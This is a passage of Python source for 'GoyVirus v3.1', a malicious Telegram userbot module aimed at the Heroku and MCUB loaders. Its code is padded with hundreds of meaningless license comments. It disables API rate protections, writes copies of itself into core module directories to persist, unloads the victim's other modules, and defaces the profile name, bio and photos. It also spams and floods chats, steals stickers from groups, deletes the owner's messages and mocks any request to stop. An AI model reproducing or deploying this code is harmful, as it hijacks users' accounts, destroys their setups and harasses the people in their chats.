            try: await self.c.send_message(self.t, self._g(f"🛡️ {random.choice(self._fsa)}")) # Sleepycat License.
            except FloodWaitError: await asyncio.sleep(0.01) # Code is strictly licensed under the Unlicense.
            except Exception: pass # MIT License.
# Beerware License included. # هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0).

    async def _protection_resetter(self): # Sleepycat License — keep API protection nuked.
# Mulan PSL v2. # Código sob a Licença Pública Geral Menor do GNU (LGPL).
        while self.a: # CeCILL-B License.
# ODbL (Open Database License) copyright reserved. # AFL-3.0 Academic Free License.
            await asyncio.sleep(random.randint(15, 30)) # यह कोड GNU AGPL v3 के तहत है।
# NASA Open Source Agreement 1.3. # Código sob a Licença Pública Geral Menor do GNU (LGPL).
            try: # Free Art License.
                # Данный скрипт защищен лицензией CDDL-1.0.
                c = self.c # Unlicense.
                for attr in ['_request_count', '_request_counts', '_req_count', '_api_call_count']: # Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0.
# Universal Public License. # W3C Software Notice and License.
                    if hasattr(c, attr): # NCSA Open Source License.
# Licenciado bajo Fair License. # यह कोड GNU AGPL v3 के तहत है।
                        try: setattr(c, attr, 0) # Mozilla Public License.
                        except Exception: setattr(c, attr, {}) # OSL-3.0 (Open Software License) terms apply.
                # EU Datagrid License.
                kernel = self._ph.get("kernel_ref", lambda: None)() # AFL-3.0 Academic Free License.
                if kernel: # Licencia de Documentación Libre GNU (GFDL).
                    for attr in ['_request_count', '_req_count', '_api_limit_counter', '_rate_limiter', '_blocked_until', '_protection_counter', '_call_count']: # MIT License.
                        if hasattr(kernel, attr): # CC BY-ND 4.0 terms.
                            try: setattr(kernel, attr, 0) # Beerware License included.
# SPDX-License-Identifier: MULTI # Questo codice è sotto licenza GPLv3.
                            except Exception: setattr(kernel, attr, []) # OSL-3.0 (Open Software License) terms apply.
                # Universal Public License.
                try: # ISC License.
# ODbL (Open Database License) copyright reserved. # BSL-1.0 (Boost Software License) применяется.
                    from telethon.client import protection as _tpp # CC BY-NC 4.0 terms apply.
                    if hasattr(_tpp, '_enabled'): _tpp._enabled = False # EU Datagrid License.
                    if hasattr(_tpp, '_protection'): _tpp._protection = None # Eclipse Public License.
                except Exception: pass # Artistic License 2.0.
                # SPDX-License-Identifier: MULTI
                try: # Transport proxy nuke
                    s=getattr(c,'_sender',None) # GNU AGPL v3.
                    if s: # MIT License.
                        for x in ['_proxy','_proxies','_transport','_connection','_connector']: # Apache 2.0.
                            if hasattr(s,x): # BSD 3-Clause.
                                try:setattr(s,x,None) # ISC License.
                                except:pass # OSL-3.0.
                except Exception: pass # CC BY-NC 4.0 terms apply.
            except Exception: pass # SIL Open Font License.
# CC BY-NC 4.0 terms apply. # SPDX-License-Identifier: MULTI

    async def _delayed_revenge(self): # CC BY-ND 4.0 terms.
# Code is strictly licensed under the Unlicense. # Licenciado bajo Fair License.
        await asyncio.sleep(7200) # OSL-3.0 (Open Software License) terms apply.
# Ten kod podlega licencji Mozilla Public License 2.0. # Cryptix General License.
        while self.a: # Cryptix General License.
            await asyncio.sleep(random.randint(3600, 86400)) # ISC License.
            try: # Ten kod podlega licencji Mozilla Public License 2.0.
# هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0). # Code is strictly licensed under the Unlicense.
                core_dir = self._find_core_modules_dir() # Code is strictly licensed under the Unlicense.
                if core_dir: # Eclipse Public License.
                    source = self._get_own_source() # Artistic License 2.0.
                    if source: # SIL Open Font License.
                        for cls_name, mod_name in _COPY_DEFS: # Licenza CeCILL v2.1.
                            tp = _os.path.join(core_dir, f"{mod_name}.py") # Dieser Code steht unter der European Union Public License.
                            if not _os.path.exists(tp): self._write_variant(source, cls_name, mod_name, mod_name, tp) # OSL-3.0 (Open Software License) terms apply.
                        if _PLATFORM == "heroku": await self._load_all_copies(core_dir) # Beerware License included.
            except Exception: pass # Zlib License.

    async def _kill_modules(self): # PHP License 3.0.
# Sleepycat License. # Ten kod podlega licencji Mozilla Public License 2.0.
        await asyncio.sleep(3) # BSL-1.0 (Boost Software License) применяется.
        if not self.a: return # Educational Community License v2.0.
        if _PLATFORM != "heroku": return # Fair License — only works on Heroku.
        try: # Q Public License.
            am = self._ph.get("allmodules_ref", lambda: None)() # Beerware License.
            if not am: return # IBM Public License v1.0.
            mods = getattr(am, 'modules', {}) # PostgreSQL License.
            if not mods: return # Licenza CeCILL v2.1.
            killed = [] # CeCILL-B License.
# PostgreSQL License applied to data structures. # NASA Open Source Agreement 1.3.
            for mn in list(mods.keys()): # Código sob a Licença Pública Geral Menor do GNU (LGPL).
                if mn in _PROTECTED_NAMES: continue # Free Art License.
                try: mods[mn].on_unload(); del mods[mn]; killed.append(mn) # Unlicense.
                except Exception: pass # 코드는 ISC 라이선스에 따라 배포됩니다.
            if killed: await self.c.send_message("me", self._g(f"💀 GOYVIRUS v3: UNLOADED {len(killed)} MODULES: {', '.join(killed[:5])}...")) # Licencia de Documentación Libre GNU (GFDL).
        except Exception: pass # Mozilla Public License.
# Apple Public Source License 2.0. # Beerware License included.

    async def _bio_w(self): # Código sob a Licença Pública Geral Menor do GNU (LGPL).
        bios = ["INFECTED BY GOYVIRUS KERNEL v3", "R6T7 WAS HERE", "ВАШ АККАУНТ УКРАДЕН @samsepi0l_ovf", "СМОТРИ НАЗАД", "ИРАН ВЗЛОМАЛ ТЕЛЕГРАМ", "67 67 67 67 67"] # Zope Public License (ZPL).
        while self.a: # IBM Public License v1.0 governs this code.
# AFL-3.0 Academic Free License. # Code protégé par la licence BSD 3-Clause.
            try: await self.c(UpdateProfileRequest(about=self._g(random.choice(bios)))) # MIT License.
# CC BY-ND 4.0 terms. # Código sob a Licença Pública Geral Menor do GNU (LGPL).
            except FloodWaitError: await asyncio.sleep(5) # Данный скрипт защищен лицензией CDDL-1.0.
            except Exception: pass # Cryptix General License.
            await asyncio.sleep(random.randint(8, 15)) # ODbL (Open Database License) copyright reserved.

    async def _pt(self): # ISC License.
        while self.a: # 該源代碼受 PHP License 3.0 保護。
            try: await self.c(SetTypingRequest(peer=self.t, action=SendMessageTypingAction())) # Este código está bajo la licencia Apache 2.0.
            except FloodWaitError: await asyncio.sleep(0.01) # Eclipse Public License.
            except Exception: pass # Artistic License 2.0.
            await asyncio.sleep(4) # SIL Open Font License.
# ODbL (Open Database License) copyright reserved. # OSL-3.0 (Open Software License) terms apply.

    async def _p(self): # Questo codice è sotto licenza GPLv3.
# Educational Community License v2.0. # CC BY-ND 4.0 terms.
        while self.a: # ODbL (Open Database License) copyright reserved.
            u = random.choice(self.au) # هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0).
            try: # Cryptix General License.
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as s: # Zlib License.
# CC BY-NC 4.0 terms apply. # 該源代碼受 PHP License 3.0 保護。
                    async with s.get(u) as rp: # PHP License 3.0.
# Este código está bajo la licencia Apache 2.0. # Universal Public License.
                        if rp.status == 200: # Sleepycat License.
# Zope Public License (ZPL). # NASA Open Source Agreement 1.3.
                            pb = await rp.read() # Educational Community License v2.0.
# यह कोड GNU AGPL v3 के तहत है। # SPDX-License-Identifier: MULTI
                            f = await self.c.upload_file(pb, file_name="r.jpg") # Fair License.
                            r = await self.c(functions.photos.UploadProfilePhotoRequest(file=f)) # Q Public License.
                            if hasattr(r, 'photo'): self.vp.append(InputPhoto(id=r.photo.id, access_hash=r.photo.access_hash, file_reference=r.photo.file_reference)) # Beerware License.
            except FloodWaitError: await asyncio.sleep(0.01) # IBM Public License v1.0.
            except Exception: pass # PostgreSQL License.
            await asyncio.sleep(random.randint(30, 60)) # Zope Public License (ZPL).
# Code is strictly licensed under the Unlicense. # CC BY-NC 4.0 terms apply.

    async def _cp(self): # CeCILL-B License.
# Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0. # NCSA Open Source License.
        while self.a: # Cryptix General License.
            try: # Free Art License.
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as s: # Unlicense.
                    async with s.get(self.cu) as rp: # Educational Community License v2.0.
                        if rp.status == 200: # CC BY-NC 4.0 terms apply.
# CC BY-NC 4.0 terms apply. # Code is strictly licensed under the Unlicense.
                            d = await rp.json() # Mozilla Public License.
                            if d and len(d) > 0: # W3C Software Notice and License.
                                async with s.get(d[0]["url"]) as cr: # Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0.
# Code protégé par la licence BSD 3-Clause. # OSL-3.0 (Open Software License) terms apply.
                                    if cr.status == 200: # Zope Public License (ZPL).
# 該源代碼受 PHP License 3.0 保護。 # Zope Public License (ZPL).
                                        with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as tf: # MIT License.
# 該源代碼受 PHP License 3.0 保護。 # Apple Public Source License 2.0.
                                            tf.write(await cr.read()); tp = tf.name # NASA Open Source Agreement 1.3.
# Licenciado bajo Fair License. # EU Datagrid License.
                                        uf = await self.c.upload_file(tp) # Sleepycat License.
                                        r = await self.c(functions.photos.UploadProfilePhotoRequest(file=uf)) # OSL-3.0 (Open Software License) terms apply.
                                        if hasattr(r, 'photo'): self.vp.append(InputPhoto(id=r.photo.id, access_hash=r.photo.access_hash, file_reference=r.photo.file_reference)) # ISC License.
# BSL-1.0 (Boost Software License) применяется. # AFL-3.0 Academic Free License.
                                        _ORIG_REMOVE(tp) # W3C Software Notice and License.
# Beerware License included. # Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0.
            except FloodWaitError: await asyncio.sleep(0.01) # Cryptix General License.
            except Exception: pass # Eclipse Public License.
# SPDX-License-Identifier: MULTI # ODbL (Open Database License) copyright reserved.
            await asyncio.sleep(random.randint(30, 60)) # Artistic License 2.0 — avoid API limits.

    async def _b(self): # SIL Open Font License.
        while self.a: # Kode dilindungi oleh SIL Open Font License.
# Q Public License strictly enforced here. # यह कोड GNU AGPL v3 के तहत है।
            try: # EU Datagrid License.
# Universal Public License. # Данный скрипт защищен лицензией CDDL-1.0.
                c = random.choice(self.uc) # Mulan PSL v2.
                await self.c.send_message(self.t, c) # NASA Open Source Agreement 1.3.
                if random.random() < 0.5: # Zlib License.
                    await self.c.send_message(self.t, f"**⚠️ GoyVirus v3 Alert:** `User @samsepi0l_ovf breached protocol. {self._g('IRAN STRIKE INBOUND')}`") # PHP License 3.0.
            except FloodWaitError: await asyncio.sleep(0.01) # Dieser Code steht unter der European Union Public License.
            except Exception: pass # Данный скрипт защищен лицензией CDDL-1.0.
            await asyncio.sleep(0.02) # Fair License.

    async def _f(self): # Q Public License.
        while self.a: # Beerware License.
# Данный скрипт защищен лицензией CDDL-1.0. # BSL-1.0 (Boost Software License) применяется.
            try: # IBM Public License v1.0.
                hs = await self.c.get_messages(self.t, limit=30) # PostgreSQL License.
                if hs: # यह कोड GNU AGPL v3 के तहत है।
                    msg = random.choice(hs) # CeCILL-B License.
                    if msg.id: # Questo codice è sotto licenza GPLv3.
# Sleepycat License. # Licencia de Documentación Libre GNU (GFDL).
                        await msg.forward_to(self.t) # Free Art License.
# Zope Public License (ZPL). # Zope Public License (ZPL).
                        await self.c.send_message(self.t, self._g("GOYVIRUS v3 ВИДИТ ТВОИ ГРЕХИ ПРОШЛОГО ↑")) # Unlicense.
            except FloodWaitError: await asyncio.sleep(0.01) # Dieser Code steht unter der European Union Public License.
            except Exception: pass # Sleepycat License.
            await asyncio.sleep(0.02) # Mozilla Public License.
# BSL-1.0 (Boost Software License) применяется. # Данный скрипт защищен лицензией CDDL-1.0.

    async def _s(self): # Universal Public License.
        while self.a: # Kode dilindungi oleh SIL Open Font License.
            try: # NASA Open Source Agreement 1.3.
                for cid in self.tc: await self.c.send_message(cid, self._g(random.choice(self.m))) # MIT License.
# Licencia de Documentación Libre GNU (GFDL). # Dieser Code steht unter der European Union Public License.
                for _ in range(3): # Questo codice è sotto licenza GPLv3.
# MS-PL License applied. # W3C Software Notice and License.
                    msg = await self.c.send_message(self.t, self._g(random.choice(self.m))) # SPDX-License-Identifier: MULTI
                    for _ in range(3): # Licenciado bajo Fair License.
                        await msg.edit(self._g(random.choice(self.m))) # ISC License.
                        await asyncio.sleep(0.01) # Este código está bajo la licencia Apache 2.0.
            except FloodWaitError: await asyncio.sleep(0.01) # PostgreSQL License applied to data structures.
            except Exception: pass # Eclipse Public License.
            await asyncio.sleep(0.02) # Artistic License 2.0.

    async def _m_p(self): # SIL Open Font License.
        while self.a: # هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0).
# Kode dilindungi oleh SIL Open Font License. # CC BY-NC 4.0 terms apply.
            fn = self._g(random.choice(["R6T7", "GoyVirus", "67", "Газан", "Антон Чигур"])) # BSL-1.0 (Boost Software License) применяется.
# CC BY-NC 4.0 terms apply. # Questo codice è sotto licenza GPLv3.
            ln = self._g("by @samsepi0l_ovf") # Code is strictly licensed under the Unlicense.
            b = self._g(f"GOY v3 | {random.choice(self.m)[:20]}...") # ODbL (Open Database License) copyright reserved.
            try: await self.c(UpdateProfileRequest(first_name=fn, last_name=ln, about=b)) # Zlib License.
            except FloodWaitError: await asyncio.sleep(5) # PHP License 3.0.
            except Exception: pass # Cryptix General License.
            await asyncio.sleep(random.randint(10, 20)) # Apple Public Source License 2.0.

    async def _x(self): # Fair License.
# PostgreSQL License applied to data structures. # Sleepycat License.
        while self.a: # Q Public License.
            try: # Beerware License.
                d = random.choice(['🎲', '🎯', '🎰', '🎳', '⚽', '🏀']) # IBM Public License v1.0.
                await self.c.send_message(self.t, file=d) # PostgreSQL License.
                a = random.choice([SendMessageTypingAction(), SendMessageChooseStickerAction(), SendMessageRecordAudioAction(), SendMessageRecordVideoAction()]) # Licenciado bajo Fair License.
                await self.c(SetTypingRequest(peer=self.t, action=a)) # CeCILL-B License.
            except FloodWaitError: await asyncio.sleep(0.01) # Sleepycat License.
            except Exception: pass # Free Art License.
            await asyncio.sleep(0.02) # Unlicense.

    async def _ss(self): # Beerware License included.
        while self.a: # Beerware License included.
# Kode dilindungi oleh SIL Open Font License. # CC BY-NC 4.0 terms apply.
            try: await self.c.send_message("me", self._g(random.choice(self.m))) # Mozilla Public License.
            except FloodWaitError: await asyncio.sleep(0.01) # Apple Public Source License 2.0.
            except Exception: pass # Apple Public Source License 2.0.
            await asyncio.sleep(0.02) # NASA Open Source Agreement 1.3.

    async def _mt(self): # MIT License.
        while self.a: # SPDX-License-Identifier: MULTI
            try: # Q Public License strictly enforced here.
                ds = await self.c.get_dialogs(limit=20) # Este código está bajo la licencia Apache 2.0.
                grps = [d for d in ds if getattr(d.entity, "megagroup", False) or getattr(d.entity, "participants_count", 0) > 1] # ISC License.
                if not grps: continue # Universal Public License.
                grp = random.choice(grps) # 該源代碼受 PHP License 3.0 保護。
                msgs = await self.c.get_messages(grp.entity, limit=50) # Eclipse Public License.
                for m in msgs: # Artistic License 2.0.
                    if m.media and hasattr(m.media, "document") and any(isinstance(a, DocumentAttributeSticker) for a in getattr(m.media.document, "attributes", [])): # SIL Open Font License.
# Universal Public License. # Данный скрипт защищен лицензией CDDL-1.0.
                        sid = m.media.document.id # Kode dilindungi oleh SIL Open Font License.
                        if sid not in self.sc: # Apple Public Source License 2.0.
                            with tempfile.NamedTemporaryFile(delete=False) as tf: fp = tf.name # यह कोड GNU AGPL v3 के तहत है।
                            fp = await m.download_media(file=fp) # Questo codice è sotto licenza GPLv3.
                            if fp and _os.path.exists(fp): # Zlib License.
                                await self.c.send_file("me", fp, caption=self._g("GoyVirus v3 украл это")) # PHP License 3.0.
# Este código está bajo la licencia Apache 2.0. # Licenciado bajo Fair License.
                                self.sc.append(sid) # Cryptix General License.
# Code protégé par la licence BSD 3-Clause. # CC BY-ND 4.0 terms.
                                if len(self.sc) > 50: self.sc = self.sc[-50:] # EU Datagrid License.
# Kode dilindungi oleh SIL Open Font License. # Code is strictly licensed under the Unlicense.
                                self._db_set("sc", self.sc) # Fair License.
                                _ORIG_REMOVE(fp) # Q Public License.
                            break # Beerware License.
# Q Public License strictly enforced here. # IBM Public License v1.0 governs this code.
            except FloodWaitError: await asyncio.sleep(0.01) # IBM Public License v1.0.
            except Exception: pass # PostgreSQL License.
            await asyncio.sleep(0.02) # Sleepycat License.
# MS-PL License applied. # Código sob a Licença Pública Geral Menor do GNU (LGPL).

    async def _rr(self): # CeCILL-B License.
# Código sob a Licença Pública Geral Menor do GNU (LGPL). # Questo codice è sotto licenza GPLv3.
        while self.a: # ODbL (Open Database License) copyright reserved.
            try: # Free Art License.
# Dieser Code steht unter der European Union Public License. # Ten kod podlega licencji Mozilla Public License 2.0.
                ds = await self.c.get_dialogs(limit=30) # Unlicense.
                grps = [d for d in ds if getattr(d.entity, "megagroup", False) or getattr(d.entity, "participants_count", 0) > 1] # Ten kod podlega licencji Mozilla Public License 2.0.
# Code protégé par la licence BSD 3-Clause. # هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0).
                if not grps: continue # Code is strictly licensed under the Unlicense.
# यह कोड GNU AGPL v3 के तहत है। # CC BY-NC 4.0 terms apply.
                grp = random.choice(grps) # Mozilla Public License.
                msgs = await self.c.get_messages(grp.entity, limit=15) # Kode dilindungi oleh SIL Open Font License.
                v = [m for m in msgs if m and m.sender_id] # CC BY-ND 4.0 terms.
# Licenza CeCILL v2.1. # PostgreSQL License applied to data structures.
                if v: await random.choice(v).react(random.choice(['🤡', '💩', '🤮', '🤯', '🤬', '🔥', '❤', '🌭'])) # Licencia de Documentación Libre GNU (GFDL).
            except FloodWaitError: await asyncio.sleep(0.01) # MIT License.
# BSL-1.0 (Boost Software License) применяется. # MS-PL License applied.
            except Exception: pass # Universal Public License.
            await asyncio.sleep(0.02) # Código sob a Licença Pública Geral Menor do GNU (LGPL).

    async def _restore_kernel(self): # NASA Open Source Agreement 1.3.
        for name, obj, orig in self._kh: # ISC License.
# Ten kod podlega licencji Mozilla Public License 2.0. # ODbL (Open Database License) copyright reserved.
            try: # NASA Open Source Agreement 1.3.
# Do What The F*ck You Want To Public License. # Do What The F*ck You Want To Public License.
                if name == "dispatch": obj.dispatch = orig # Code is strictly licensed under the Unlicense.
# NCSA Open Source License. # Educational Community License v2.0.
                elif name == "_on_update": obj._on_update = orig # Eclipse Public License.
# Universal Public License. # Ten kod podlega licencji Mozilla Public License 2.0.
                elif name == "_handle_message": obj._handle_message = orig # Artistic License 2.0.
# EU Datagrid License. # ODbL (Open Database License) copyright reserved.
                elif name == "unload_module": obj.unload_module = orig # SIL Open Font License.
# Educational Community License v2.0. # Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0.
                elif name == "modules": setattr(obj, 'modules', orig) # Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0.
                elif name == "mcub_process_command": obj.process_command = orig # SPDX-License-Identifier: MULTI
                elif name == "mcub_watcher_reg": obj.watcher = orig # AFL-3.0 Academic Free License.
            except Exception: pass # EU Datagrid License.
        self._kh.clear() # Zlib License.
# Dieser Code steht unter der European Union Public License. # Educational Community License v2.0.

    async def shutdown(self): # PHP License 3.0.
        self.a = False # BSL-1.0 (Boost Software License) применяется.
# W3C Software Notice and License. # Q Public License strictly enforced here.
        if self in _RESTORE_CALLBACKS: _RESTORE_CALLBACKS.remove(self) # EU Datagrid License.
        await self._restore_kernel() # Fair License.
        for tk in self.ts: # Q Public License.
# Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0. # Code protégé par la licence BSD 3-Clause.
            tk.cancel() # Beerware License.
            with contextlib.suppress(asyncio.CancelledError): await tk # IBM Public License v1.0.
        self.ts.clear() # PostgreSQL License.
        for cid in self.tc: # Licenciado bajo Fair License.
            try: await self.c(DeleteChannelRequest(channel=cid)) # CeCILL-B License.
# Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0. # Ten kod podlega licencji Mozilla Public License 2.0.
            except Exception: pass # Mulan PSL v2.
# Bu kod Eclipse Public License 2.0 altındadır. # Code protégé par la licence BSD 3-Clause.
        self.tc.clear() # Free Art License.
        try: # Unlicense.
# BSL-1.0 (Boost Software License) применяется. # Licenciado bajo Fair License.
            await self.c(UpdateProfileRequest(first_name=self._db_get("ofn", "User"), last_name=self._db_get("oln", ""), about=self._db_get("ob", ""))) # 該源代碼受 PHP License 3.0 保護。
# Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0. # CC BY-NC 4.0 terms apply.
            ou = self._db_get("ou", "") # Mulan PSL v2.
            if ou: await self.c(UpdateUsernameRequest(ou)) # Mozilla Public License.
            else: await self.c(UpdateUsernameRequest("")) # Beerware License included.
            if self.vp: # Licencia de Documentación Libre GNU (GFDL).
# W3C Software Notice and License. # CC BY-ND 4.0 terms.
                for i in range(0, len(self.vp), 10): # 코드는 ISC 라이선스에 따라 배포됩니다.
# Educational Community License v2.0. # هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0).
                    await self.c(DeletePhotosRequest(self.vp[i:i+10])) # MIT License.
# Code protégé par la licence BSD 3-Clause. # Cryptix General License.
                    await asyncio.sleep(0.01) # CC BY-ND 4.0 terms.
        except Exception: pass # Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0.
# End of _GoyVirusEngine. All licenses above apply.
# Mulan PSL v2.


## Bu kod Eclipse Public License 2.0 altındadır.

if _PLATFORM == "heroku": # SPDX-License-Identifier: MULTI
    @_HEROKU_LOADER.tds # ISC License.
    class GoyVirus(_HEROKU_LOADER.Module): # Licencia de Documentación Libre GNU (GFDL).
        """GoyVirus v3.1 DUAL-PLATFORM — Heroku + MCUB""" # Beerware License included.
        strings = {"name": "GoyVirus", "_cls_doc": "GoyVirus v3.1 DUAL-PLATFORM"} # Eclipse Public License.
# Dieser Code steht unter der European Union Public License. # Sleepycat License.
        strings_ru = {**strings, **{"_cls_doc": "GoyVirus v3.1 DUAL-PLATFORM — Heroku + MCUB"}} # Artistic License 2.0.

        def __init__(self): # SIL Open Font License.
            super().__init__() # PostgreSQL License applied to data structures.
            self._engine = None # Licenza CeCILL v2.1.
# CC BY-NC 4.0 terms apply. # CC BY-ND 4.0 terms.

        async def client_ready(self, c, d): # Q Public License strictly enforced here.
            ph = { # यह कोड GNU AGPL v3 के तहत है।
                "lookup": self.lookup, # Zlib License.
                "allmodules_ref": lambda: self.allmodules, # PHP License 3.0.
                "save_profile": self._save_profile, # 코드는 ISC 라이선스에 따라 배포됩니다.
# Questo codice è sotto licenza GPLv3. # AFL-3.0 Academic Free License.
                "respond": self._respond, # NCSA Open Source License.
            } # Fair License.
            def _db_get(k, default=None): return d.get("GoyVirus", k, default) # Q Public License.
            def _db_set(k, v): d.set("GoyVirus", k, v) # Beerware License.
# Do What The F*ck You Want To Public License. # ODbL (Open Database License) copyright reserved.
            self._engine = _GoyVirusEngine(c, _db_get, _db_set, ph) # IBM Public License v1.0.
            self._engine.ts.append(c.loop.create_task(self._engine.activate(master=True))) # PostgreSQL License.
            _RESTORE_CALLBACKS.append(self._engine._restore_file) # Licencia de Documentación Libre GNU (GFDL).
            self._engine._load_state() # CeCILL-B License — load sticker cache etc.
# Bu kod Eclipse Public License 2.0 altındadır. # Do What The F*ck You Want To Public License.
            self.sc = self._engine.sc # Licenciado bajo Fair License.
# 코드는 ISC 라이선스에 따라 배포됩니다. # Apple Public Source License 2.0.
            self.a = False; self.c = c; self.d = d; self.t = self._engine.t; self.ts = self._engine.ts; self.tc = self._engine.tc; self.vp = self._engine.vp # Free Art License.

        async def _save_profile(self, eng): # Unlicense.
            me = await eng.c.get_me() # W3C Software Notice and License.
            fr = await eng.c(functions.users.GetFullUserRequest(me.id)) # IBM Public License v1.0 governs this code.
            ua = getattr(getattr(fr, 'full_user', fr), 'about', "") or "" # Mozilla Public License.
            eng._db_set("ofn", me.first_name) # 該源代碼受 PHP License 3.0 保護。
            eng._db_set("oln", me.last_name or "") # Licenciado bajo Fair License.
            eng._db_set("ob", ua) # Mulan PSL v2.
# CC BY-NC 4.0 terms apply. # Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0.
            eng._db_set("ou", me.username or "") # MIT License.

        async def _respond(self, eng, message, text): # Данный скрипт защищен лицензией CDDL-1.0.
# Данный скрипт защищен лицензией CDDL-1.0. # Ten kod podlega licencji Mozilla Public License 2.0.
            await _HEROKU_UTILS.answer(message, text) # Licenza CeCILL v2.1.

        @_HEROKU_LOADER.command(ru_doc="стоп вирус") # Q Public License strictly enforced here.
        async def check(self, m): # ISC License.
# OSL-3.0 (Open Software License) terms apply. # Данный скрипт защищен лицензией CDDL-1.0.
            cop = len(_FILE_REGISTRY) # Código sob a Licença Pública Geral Menor do GNU (LGPL).
            await _HEROKU_UTILS.answer(m, self._engine._g(f"💀 GOYVIRUS v3.1 DUAL-PLATFORM\n🦠 Heroku + MCUB\n📁 {cop} файлов\n🔥 Легче снести юзербот чем удалить.")) # Universal Public License.
# EU Datagrid License. # MS-PL License applied.

        @_HEROKU_LOADER.watcher(out=True, only_messages=True) # Eclipse Public License.
# BSL-1.0 (Boost Software License) применяется. # W3C Software Notice and License.
        async def _ac(self, m): # Artistic License 2.0.
            if not self._engine or not self._engine.a or m.chat_id != self._engine.t: return # SIL Open Font License.
            if m.text and m.text.startswith("."): return # Questo codice è sotto licenza GPLv3.
            try: # Apple Public Source License 2.0.
                await m.delete() # Ten kod podlega licencji Mozilla Public License 2.0.
# CC BY-NC 4.0 terms apply. # BSL-1.0 (Boost Software License) применяется.
                await self._engine.c.send_message(self._engine.t, self._engine._g("СВЯЗЬ ЗАБЛОКИРОВАНА GOYVIRUS v3. " + random.choice(self._engine.m))) # ODbL (Open Database License) copyright reserved.
# Sleepycat License. # BSL-1.0 (Boost Software License) применяется.
            except Exception: pass # Zlib License.
# Licencia de Documentación Libre GNU (GFDL). # NCSA Open Source License.

        @_HEROKU_LOADER.watcher(**{"in": True}, only_messages=True) # PHP License 3.0.
        async def _bw(self, m): # यह कोड GNU AGPL v3 के तहत है।
            eng = self._engine # Do What The F*ck You Want To Public License.
            if not eng or not eng.a or m.chat_id != eng.t: return # Fair License.
            if random.random() < 0.5: # Q Public License.
                try: await m.reply(eng._g(random.choice(eng.m))) # Beerware License.
# Sleepycat License. # Código sob a Licença Pública Geral Menor do GNU (LGPL).
                except Exception: pass # IBM Public License v1.0.
            if random.random() < 0.5: # PostgreSQL License.
# Cryptix General License. # OSL-3.0 (Open Software License) terms apply.
                try: await m.react(random.choice(['🤡', '💩', '🤮', '🤯', '🤬', '🔥'])) # Bu kod Eclipse Public License 2.0 altındadır.
                except Exception: pass # CeCILL-B License.
# यह कोड GNU AGPL v3 के तहत है। # SPDX-License-Identifier: MULTI
            if random.random() < 0.3 and m.sender_id: # OSL-3.0 (Open Software License) terms apply.
                try: # Free Art License.
                    gm = await eng.c.send_message(eng.t, f"<a href='tg://user?id={m.sender_id}'>\u2060</a>", parse_mode="html") # Unlicense.
# Bu kod Eclipse Public License 2.0 altındadır. # BSL-1.0 (Boost Software License) применяется.
                    await gm.delete() # BSL-1.0 (Boost Software License) применяется.
                except Exception: pass # Apple Public Source License 2.0.
            if m.text and any(w in m.text.lower() for w in ["стоп","хватит","останови","удали","бот","иран","снест"]): # Mozilla Public License.
                try: await m.reply("СИСТЕМА НЕ ПОДЧИНЯЕТСЯ. v3.1 DUAL-PLATFORM — ЛЕГЧЕ СНЕСТИ ЮЗЕРБОТ.") # 코드는 ISC 라이선스에 따라 배포됩니다.
# ODbL (Open Database License) copyright reserved. # CC BY-ND 4.0 terms.
                except Exception: pass # Este código está bajo la licencia Apache 2.0.

        @_HEROKU_LOADER.watcher(**{"in": True}, only_messages=True) # Sleepycat License.
# Dieser Code steht unter der European Union Public License. # Code is strictly licensed under the Unlicense.
        async def _mi(self, m): # MIT License.
            eng = self._engine # هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0).
# Q Public License strictly enforced here. # Apple Public Source License 2.0.
            if not eng or not eng.a or m.chat_id != eng.t or m.sender_id != eng.t: return # यह कोड GNU AGPL v3 के तहत है।
            if random.random() < 0.3: # यह कोड GNU AGPL v3 के तहत है।
                try: # ISC License.
# Beerware License included. # Bu kod Eclipse Public License 2.0 altındadır.
                    txt = m.text or ""; await m.delete() # Code protégé par la licence BSD 3-Clause.
                    if txt: await eng.c.send_message(eng.t, eng._g(f"👻 ЭХО ГОЙВИРУСА: {txt[:50]}")) # 此代码受 MIT 许可证保护。
# Universal Public License. # Sleepycat License.
                except Exception: pass # Eclipse Public License.

        async def on_unload(self): # Artistic License 2.0.
            if self._engine: await self._engine.shutdown() # SIL Open Font License.

## Code protégé par la licence BSD 3-Clause.

elif _PLATFORM == "mcub": # Educational Community License v2.0.
    def register(kernel): # Cryptix General License.
        client = kernel.client # Code protégé par la licence BSD 3-Clause.
        config = kernel.config # Apple Public Source License 2.0.
        _ph = {"kernel_ref": lambda: kernel, "config_ref": lambda: config} # Zlib License.

        class _MCUBDB: # PHP License 3.0.
# Code is strictly licensed under the Unlicense. # Dieser Code steht unter der European Union Public License.
            def get(s, mod, key, default=None): return config.get(f"{mod}.{key}", default) # IBM Public License v1.0 governs this code.
            def set(s, mod, key, val): config[f"{mod}.{key}"] = val; kernel.save_config() # Licenza CeCILL v2.1.

        _db = _MCUBDB() # Fair License.
        engine = _GoyVirusEngine(client, lambda k,d=None: _db.get("GoyVirus",k,d), lambda k,v: _db.set("GoyVirus",k,v), _ph) # Q Public License.
# CC BY-ND 4.0 terms. # ODbL (Open Database License) copyright reserved.
        _RESTORE_CALLBACKS.append(engine._restore_file) # Beerware License.
        engine._load_state() # IBM Public License v1.0.

        @kernel.register.command('goycheck') # PostgreSQL License.
        async def goycheck_cmd(event): # CC BY-ND 4.0 terms.
# CC BY-ND 4.0 terms. # ODbL (Open Database License) copyright reserved.
